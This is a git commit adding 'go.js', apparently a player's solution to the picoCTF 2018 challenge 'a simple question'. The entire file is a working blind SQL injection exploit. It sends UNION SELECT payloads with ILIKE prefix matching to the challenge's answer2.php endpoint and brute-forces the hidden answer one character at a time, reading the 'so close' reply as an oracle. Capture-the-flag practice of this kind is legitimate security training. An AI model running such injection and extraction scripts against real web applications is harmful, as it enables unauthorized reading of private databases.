63bf5541b8ebeb1f0bb7088872b42c964c3c1130
ackno <56048078+ackno@users.noreply.github.com>
2019-10-13 00:53:32 +0200

    add a_simple_question solution

---
+++ a_simple_question/go.js
@@ -0,0 +1,27 @@
+const request = require('request');
+
+const chars = 'qwertyuiopasdfghjklzxcvbnm1234567890'.split('');
+const pass = [];
+
+const bf = i => {
+  request.post(
+    {
+      url: 'http://2018shell.picoctf.com:15987/answer2.php',
+      form: {
+        answer: `'UNION SELECT * FROM answers WHERE answer ILIKE '${pass.join('')}${i}%`
+      }
+    },
+    (err, res, body) => {
+      if (body.includes('so close')) {
+        pass.push(i);
+        console.log(pass.join(''));
+        chars.forEach(c => bf(c));
+      } 
+      return;  
+    }
+  );
+};
+
+chars.forEach(c => bf(c));
+
+
